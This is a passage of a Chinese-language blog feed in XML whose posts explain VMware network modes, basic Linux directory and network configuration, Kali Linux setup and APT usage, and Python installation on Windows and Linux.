href="https://blog.csdn.net/zz210891470/article/details/81354568">Git初次使用步骤</a></li><li>[git]merge和rebase的区别</li></ul><blockquote><ul><li><a href="https://www.cnblogs.com/xueweihan/p/5743327.html">https://www.cnblogs.com/xueweihan/p/5743327.html</a></li><li><a href="https://www.cnblogs.com/ellen-mylife/p/12794245.html">https://www.cnblogs.com/ellen-mylife/p/12794245.html</a></li><li><a href="https://www.jianshu.com/p/0cd05dd1cc73">https://www.jianshu.com/p/0cd05dd1cc73</a></li></ul></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware使用</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/vmware%E4%BD%BF%E7%94%A8.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/vmware%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="vmware虚拟网卡的解释"><a href="#vmware虚拟网卡的解释" class="headerlink" title="vmware虚拟网卡的解释"></a>vmware虚拟网卡的解释</h1><p>为什么windows主机可以访问内网的网站呢，为什么可以ping通Ubuntu和win7呢，因为在VM里创建虚拟网卡的时候，在Windows上面也创建了虚拟网卡，通过<code>IPconfig /all</code>命令，可以看得到。如果不想让主机访问到内网，可以在设置里面禁用虚拟网卡或者设置防火墙：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181001851.png" alt="image-20220818095458787" style="zoom:50%;" /><p>在每次用vmware启用一个虚拟网络的时候，会工根据所选择的网卡模式，产生不同的虚拟网段和虚拟网卡</p><p>安装了VMware的时候电脑上默认会出现三块虚拟网卡VMware Network Adapter VMnet0、VMware Network Adapter VMnet1和VMware Network Adapter VMnet8.</p><blockquote><ul><li>VMnet0：一般用于桥接模式</li><li>VMnet1：一般用于仅主机模式</li><li>VMnet8：一般用于NAT模式</li></ul></blockquote><h1 id="虚拟网卡的三种模式"><a href="#虚拟网卡的三种模式" class="headerlink" title="虚拟网卡的三种模式"></a>虚拟网卡的三种模式</h1><h2 id="桥接模式-Bridged"><a href="#桥接模式-Bridged" class="headerlink" title="桥接模式(Bridged)"></a>桥接模式(Bridged)</h2><p>桥接是和主机并列，桥接到路由器，虚拟机地址由路由器分配，也就是，主机和kali在同一网段！</p><p>桥接模式可以简单理解为通过物理主机网卡架设了一座桥，从而连入到了实际网络中。因此，虚拟机可以被分配与物理主机相同网段的独立IP，所有网络功能和网络中的真实机器几乎完全一样。桥接模式下的虚拟机和网内真实计算机所处的位置是一样的。在Bridged模式下，电脑设备创建的虚拟机就像一台真正的计算机一样，它会直接连接到实际的网络上，上网与宿主机（电脑设备）没有联系。Bridged网络类型的原理逻辑图下图所示。所以，现在是不是可以理解 在虚拟网卡中 没有 VMware Network AdepterVMnet0 了 ，因为它就是 宿主机 所在局域网 中的另外一台主机。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221431670.png" alt="image-20220922143109469" style="zoom: 33%;" /><h3 id="配置步骤："><a href="#配置步骤：" class="headerlink" title="配置步骤："></a>配置步骤：</h3><blockquote><p>1、点击“编辑虚拟机设置”来设置网卡模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602019.png" alt="image-20220922154047072" style="zoom:50%;" /><p>2、如想配置静态地址则可打开 vim &#x2F;etc&#x2F;network&#x2F;interfaces 进行配置</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602089.png" alt="image-20220922154057911" style="zoom:50%;" /><p>3、在配置dns解析服务器使用命令打开 vi &#x2F;etc&#x2F;resolv.conf</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602069.png" alt="image-20220922154106114" style="zoom:50%;" /></blockquote><h2 id="仅主机模式-Host-Only"><a href="#仅主机模式-Host-Only" class="headerlink" title="仅主机模式(Host-Only)"></a>仅主机模式(Host-Only)</h2><p>原理：在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是 Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMwareNetworkAdepterVMnet1虚拟网卡来实现的。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221431704.png" alt="image-20220922143126396" style="zoom: 33%;" /><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h3><blockquote><ol><li>点“编辑”设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221539342.png" alt="image-20220922153956221" style="zoom:50%;" /><ol start="2"><li><p>设置虚拟机为Host-Only模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540726.png" alt="image-20220922154008639" style="zoom:50%;" /></li><li><p>设置网卡文件vim &#x2F;etc&#x2F;network&#x2F;interfaces设置静态ip</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221600390.png" alt="image-20220922154018569" style="zoom:50%;" /><ol start="4"><li>保存退出，然后重启网络服务 <code>systemctl restart networking</code></li></ol></blockquote><h2 id="NAT模式-地址转换"><a href="#NAT模式-地址转换" class="headerlink" title="NAT模式(地址转换)"></a>NAT模式(地址转换)</h2><p>NAT（Network Address Translation），网络地址转换，NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。 这种模式也是使用Vmware虚拟机最常用的模式。在NAT模式下，虚拟机的网卡连接到宿主机的VMnet8上（安装完Vmware虚拟机会多出两个虚拟网卡Vmware1和Vmware8）。此时系统的VMware NAT Service服务就充当了路由器，负责将虚拟机发到VMnet8的包进行地址转换之后发到实际的网络上，再将实际网络上返回的包进行地址转换后通过VMnet8发送给虚拟机。VMware DHCP Service负责为虚拟机分配IP地址。NAT网络类型的原理逻辑图如下图所示。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221430774.png" alt="image-20220922143026568" style="zoom:33%;" /><p>nat模式下的虚拟网卡简而言之就是一个虚拟的路由器。nat模式下的虚拟机ip是怎么来的呢，就是依靠主机虚拟网卡vmnet8，分配的地址。通过nat得到的ip是和虚拟网卡在同一网段的。一般来说，nat模式下的虚拟机的网关也就是虚拟网卡vmnet8的地址~~</p><p>下面的图中可以直观的看到：</p><p>这是主机vmnet8的地址，也就是vmware虚拟化的网卡，地址是192.168.1.1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221426815.png" alt="image-20220922142620659" style="zoom:50%;" /><p>这是nat模式下的kali虚拟机ip，被分配了一个在1网段的内网地址，实际上就是vmnet8的作用</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221427897.png" alt="image-20220922142716754" style="zoom:50%;" /><h3 id="配置步骤：-1"><a href="#配置步骤：-1" class="headerlink" title="配置步骤："></a>配置步骤：</h3><blockquote><p>1、kali如果使用dhcp则可不进行配置</p><p>2、配置静态ip：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221604802.png" alt="image-20220922154132900" style="zoom:50%;" /></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用基础</title>
      <link href="/%E7%9F%A5%E8%AF%86/Linux/Linux-%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Linux/Linux-%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h1><p>Kali Linux是基于debian的发行版。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940750.png" alt="image-20220818094012557" style="zoom:50%;" /><h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940707.png" alt="image-20220818094044556" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/：根目录，每一个文件和目录都从这里开始。只有root用户具有该目录下的写权限。</span><br><span class="line">/bin：用户二进制文件，包含二进制可执行文件。系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。</span><br><span class="line">/boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</span><br><span class="line">/dev ：设备文件，dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</span><br><span class="line">/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。</span><br><span class="line">/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</span><br><span class="line">/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</span><br><span class="line">/opt：可选的附加应用程序，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库就可以放到这个目录下。默认是空的。</span><br><span class="line">/root：该目录为系统管理员，也称作超级权限者的用户主目录。</span><br><span class="line">/sbin：s就是Super User的意思，系统二进制文件，在这个目录下的linux命令通常由系统管理员使用。</span><br><span class="line">/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</span><br><span class="line">/usr/bin：系统用户使用的应用程序。</span><br><span class="line">/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。</span><br><span class="line">/tmp：这个目录是用来存放一些临时文件的。</span><br><span class="line">/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</span><br></pre></td></tr></table></figure><h1 id="Kali配置"><a href="#Kali配置" class="headerlink" title="Kali配置"></a>Kali配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo su</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="linux网络配置文件详解-设置固定IP）"><a href="#linux网络配置文件详解-设置固定IP）" class="headerlink" title="linux网络配置文件详解(设置固定IP）"></a>linux网络配置文件详解(设置固定IP）</h2><blockquote><p>eth0，eth1，eth2……代表网卡一，网卡二，网卡三……</p><p>lo代表回环地址127.0.0.1，即localhost</p></blockquote><p>如果不想通过DHCP随机分配ip地址（当IP租期一过就会重新分配），就需要通过修改网络配置文件，改为固定的IP，文件所在目录如下：</p><p>&#x3D;&#x3D;&gt;centos的网络配置文件在<code>/etc/sysconfig/network-scripts</code>目录下</p><blockquote><ul><li><p><a href="https://www.cnblogs.com/ArthurYu/p/13908934.html">https://www.cnblogs.com/ArthurYu/p/13908934.html</a></p></li><li><p><a href="https://blog.csdn.net/weixin_42476945/article/details/104164056">https://blog.csdn.net/weixin_42476945/article/details/104164056</a></p></li></ul></blockquote><p>&#x3D;&#x3D;&gt;ubuntu的网络配置文件在<code>/etc/network</code>目录下</p><blockquote><ul><li><a href="https://blog.csdn.net/qq_38880380/article/details/99442543#:~:text=Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%20%EF%BC%9A%20%E4%B8%80%E3%80%81linux%20%E7%BD%91%E7%BB%9C%20%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BD%A2%E5%BC%8F%20%E5%85%88%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%8B%E7%BB%99Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C,%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%20%EF%BC%9A%201.%E8%BF%9B%E5%85%A5interfaces%20%E9%85%8D%E7%BD%AE%20sudo%20vi%20%2Fetc%2Fnetwork%2Finterfaces%202.">linux–ubuntu网络配置</a></li><li><a href="https://www.cnblogs.com/lshan/p/15787497.html">ubuntu20.04 修改　DNS 　ip</a></li></ul></blockquote><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置文件位置：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">1. DEVICE=eth0 网卡的名字</span><br><span class="line">2. HWADDR=00:0c:29:90:89:d9 HWADDR HardWare Address 硬件地址 MAC地址</span><br><span class="line">3. TYPE=Ethernet 网络类型 以太网</span><br><span class="line">4. UUID=ae779ae6-044d-43d5-a33b-48c89e8de10e #UUID 做到系统中独一无二。</span><br><span class="line">5. ONBOOT=yes BOOT ON ? 在开机或重启网卡的时候是否启动网卡</span><br><span class="line">6. NM_CONTROLLED=yes 是否受network程序管理</span><br><span class="line">7. BOOTPROTO=none 网卡是如何获取到ip地址 网卡获取ip地址的方式</span><br><span class="line">　　a. dhcp 自动获取ip地址</span><br><span class="line">　　b. none 固定的ip地址</span><br><span class="line">　　c. static 固定的ip地址</span><br><span class="line">8. IPADDR=10.0.0.100 IPADDR ip地址</span><br><span class="line">9. NETMASK=255.255.255.0 子网掩码 决定这个局域网中最多有多少台机器</span><br><span class="line">10. GATEWAY=10.0.0.2 网关 整个大楼的大门</span><br><span class="line">11. USERCTL=no 普通用户是否能控制网卡</span><br><span class="line">12. /etc/resolv.conf 配置DNS 网卡配置文件的DNS优先于/etc/resolv.conf</span><br><span class="line">13. DNS 域名解析器 阿里的域名解析器：223.5.5.5 223.6.6.6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启网卡命令（centos）</span></span><br><span class="line">/etc/init.d/network restart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者</span></span><br><span class="line">nmcli c reload</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">HWADDR=00:0c:29:2d:d7:44</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.22.11</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.22.1</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens37</span><br><span class="line">UUID=a18a03de-36a2-36a2-8514-0232129b08b0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">AUTOCONNECT_PRIORITY=-999</span><br></pre></td></tr></table></figure><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看自己的网卡编号</span></span><br><span class="line">ip a</span><br><span class="line"><span class="comment">#配置网卡静态或者动态IP：</span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line"><span class="comment">#配置DNS：</span></span><br><span class="line">vim /etc/resolv.conf</span><br><span class="line">vim /etc/systemd/resolved.conf</span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">service networking restart</span><br><span class="line">service network-manager restart</span><br><span class="line"><span class="comment">#或者--建议使用，新版的操作</span></span><br><span class="line">systemctl restart network.service</span><br><span class="line"><span class="comment">#自动获取IP(在固定IP模式下不生效）：</span></span><br><span class="line">dhclient</span><br><span class="line"><span class="comment">#启动网卡:当ifconfig后，只看到lo网卡时，那说明eth0网卡，并没有启动，这个时候使用启动网卡的命令</span></span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置静态IP：/etc/network/interfaces</span></span><br><span class="line">auto lo  # lo接口会在系统启动时自动配置</span><br><span class="line">iface lo inet loopback  # 将lo接口设置为一个本地回环(loopback)地址</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.228</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">动态获取IP配置方法：</span></span><br><span class="line">auto ens33  # ens33接口会在系统启动时自动配置</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure><h4 id="Ubuntu20-04-LTS版本修改DNS"><a href="#Ubuntu20-04-LTS版本修改DNS" class="headerlink" title="Ubuntu20.04 LTS版本修改DNS"></a><strong>Ubuntu20.04 LTS版本修改DNS</strong></h4><p>修改 &#x2F;etc&#x2F;systemd&#x2F;resolved.conf 文件，在其中添加dns信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/systemd/resolved.conf</span><br><span class="line">DNS=114.114.114.114 192.168.10.213 192.168.22.1 192.168.33.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#可提供的DNS服务器</span></span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line">nameserver 192.168.10.213</span><br><span class="line">nameserver 192.168.22.1</span><br><span class="line">nameserver 192.168.33.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure><p>在ubuntu终端中依次执行如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart systemd-resolved</span><br><span class="line">systemctl <span class="built_in">enable</span> systemd-resolved</span><br><span class="line"><span class="built_in">mv</span> /etc/resolv.conf /etc/resolv.conf.bak</span><br><span class="line"><span class="built_in">ln</span> -s /run/systemd/resolve/resolv.conf /etc/</span><br><span class="line"><span class="comment">#原本所谓的/etc/resolv.conf文件就是指向/run/systemd/resolve/resolv.conf的软链接</span></span><br></pre></td></tr></table></figure><p>再查看<code>cat /etc/resolv.conf</code>文件就可以看到新的dns信息已经写入其中了。</p><p>最后重启NetworkManager：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><h2 id="设置APT源"><a href="#设置APT源" class="headerlink" title="设置APT源"></a>设置APT源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get clean</span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="APT使用"><a href="#APT使用" class="headerlink" title="APT使用"></a>APT使用</h2><h3 id="apt-get-amp-apt"><a href="#apt-get-amp-apt" class="headerlink" title="apt-get &amp; apt"></a>apt-get &amp; apt</h3><p>apt-get  可以从认证软件源下载软件包及相关信息，以便安装和升级软件包，或者用于移除软件包。在这些过程中，软件包依赖会被妥善处理。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update - 取回更新的软件包列表信息</span><br><span class="line">upgrade - 进行一次升级</span><br><span class="line">install - 安装新的软件包(注：软件包名称是 libc6 而非libc6.deb)</span><br><span class="line">reinstall - Reinstall packages (pkg is libc6 not libc6.deb)</span><br><span class="line">remove - 卸载软件包</span><br></pre></td></tr></table></figure><h3 id="apt-与-apt-get的区别与解释"><a href="#apt-与-apt-get的区别与解释" class="headerlink" title="apt 与 apt-get的区别与解释"></a>apt 与 apt-get的区别与解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单来说就是：apt = apt-get、apt-cache 和 apt-config 中最常用命令选项的集合。</span><br></pre></td></tr></table></figure><ul><li>虽然 apt  与 apt-get  有一些类似的命令选项，但它并不能完全向下兼容 apt-get  命令。也就是说，可以用 apt  替换部分 apt-get  系列命令，但不是全部。</li><li>apt  可以看作 apt-get  和 apt-cache  命令的子集, 可以为包管理提供必要的命令选项。</li><li>apt-get  虽然没被弃用，但作为普通用户，还是应该首先使用 apt 。</li></ul><table><thead><tr><th align="center">apt 命令</th><th align="center">取代的命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt install</td><td align="center">apt-get install</td><td align="center">安装软件包</td></tr><tr><td align="center">apt remove</td><td align="center">apt-get remove</td><td align="center">移除软件包</td></tr><tr><td align="center">apt purge</td><td align="center">apt-get purge</td><td align="center">移除软件包及配置文件</td></tr><tr><td align="center">apt update</td><td align="center">apt-get update</td><td align="center">刷新存储库索引</td></tr><tr><td align="center">apt upgrade</td><td align="center">apt-get upgrade</td><td align="center">升级所有可升级的软件包</td></tr><tr><td align="center">apt autoremove</td><td align="center">apt-get autoremove</td><td align="center">自动删除不需要的包</td></tr><tr><td align="center">apt full-upgrade</td><td align="center">apt-get dist-upgrade</td><td align="center">在升级软件包时自动处理依赖关系</td></tr><tr><td align="center">apt search</td><td align="center">apt-cache search</td><td align="center">搜索应用程序</td></tr><tr><td align="center">apt show</td><td align="center">apt-cache show</td><td align="center">显示装细节</td></tr></tbody></table><p>当然，apt 还有一些自己的命令：</p><table><thead><tr><th align="center">新的apt命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt list</td><td align="center">列出包含条件的包（已安装，可升级等）</td></tr><tr><td align="center">apt edit-sources</td><td align="center">编辑源列表</td></tr></tbody></table><p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p><blockquote><p><a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释</a></p></blockquote><h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装中文字体</span></span><br><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br><span class="line"><span class="comment">#设置语言</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="comment">#进入图形界面，选中 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 并将 zh_CN.UTF-8 选为默认。（空格是选择，tab是切换， * 是选中）</span></span><br><span class="line">重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><strong>Kali工具</strong>:</p><ul><li><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></li><li><a href="https://github.com/Jack-Liang/kalitools">https://github.com/Jack-Liang/kalitools</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Kali配置与使用</title>
      <link href="/%E7%9F%A5%E8%AF%86/Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>建议虚拟机搞kali~</p><h1 id="VMware安装"><a href="#VMware安装" class="headerlink" title="VMware安装"></a>VMware安装</h1><ol><li>通过scoop进行安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装软件镜像包源 scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">2、通过搜索 scoop search vmware</span><br><span class="line">3、进行下载安装 scoop install vmware-workstation-pro</span><br></pre></td></tr></table></figure><ol start="2"><li>下载vmware</li></ol><blockquote><p>Vmware官网：<a href="https://www.vmware.com/">https://www.vmware.com/</a></p></blockquote><ol start="3"><li>激活vmware</li></ol><h1 id="Kali简介"><a href="#Kali简介" class="headerlink" title="Kali简介"></a>Kali简介</h1><blockquote><p><a href="https://www.kali.org/docs/introduction/what-is-kali-linux/">https://www.kali.org/docs/introduction/what-is-kali-linux/</a></p></blockquote><h2 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h2><blockquote><p>Kali官网下载：</p><p>Get Kali | Kali Linux：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p><p><a href="https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z">https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z</a></p></blockquote><h1 id="Vmware安装Kali"><a href="#Vmware安装Kali" class="headerlink" title="Vmware安装Kali"></a>Vmware安装Kali</h1><p>解压下载的压缩包 kali-linux-2022.1-vmware-amd64.7z , 双击打开下.vmx 文件</p><p>点击 开启此虚拟机 ，即可启动。</p><p>系统已经配置好默认普通用户 kali ，默认密码 kali </p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python环境安装</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Windows安装Python2-x2F-3"><a href="#Windows安装Python2-x2F-3" class="headerlink" title="Windows安装Python2&#x2F;3"></a>Windows安装Python2&#x2F;3</h1><h2 id="通过scoop安装"><a href="#通过scoop安装" class="headerlink" title="通过scoop安装"></a>通过scoop安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、添加versions镜像源 scoop bucket add versions</span><br><span class="line">2、通过命令进行搜索 scoop search python</span><br><span class="line">3、选定对应的python版本进行安装</span><br><span class="line">scoop install python27</span><br><span class="line">scoop install python</span><br></pre></td></tr></table></figure><h2 id="Python官网下载安装"><a href="#Python官网下载安装" class="headerlink" title="Python官网下载安装"></a>Python官网下载安装</h2><h3 id="下载安装程序："><a href="#下载安装程序：" class="headerlink" title="下载安装程序："></a>下载安装程序：</h3><blockquote><p><a href="https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe">https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe</a></p><p><a href="https://www.python.org/downloads/release/python-377/">https://www.python.org/downloads/release/python-377/</a></p></blockquote><p>Customize installation：自定义安装pip、IDLE、安装路径等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180111556.png" alt="image-20220818011126154" style="zoom:50%;" /><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><ol><li>点击此电脑选择高级系统设置，在选择环境变量</li><li>找到path</li><li>添加python的安装路径到此处即可</li><li>添加pip的环境变量，同理，pip在python的scripts目录下及添加到path中即可</li></ol><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><ol><li>使用windows+R键，打开cmd输入python显示出python版本既配置成功</li><li>pip配置是否成功。输入pip3 看是否提示出帮助信息。</li></ol><h1 id="Linux安装Python2-x2F-3"><a href="#Linux安装Python2-x2F-3" class="headerlink" title="Linux安装Python2&#x2F;3"></a>Linux安装Python2&#x2F;3</h1><h2 id="一些注意事项："><a href="#一些注意事项：" class="headerlink" title="一些注意事项："></a>一些注意事项：</h2><p>在linux中存在多个版本python，这个时候，我们如果想在指定版本的目录里安装相应的模块，应该是使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --target=目标路径  工具包名字</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a 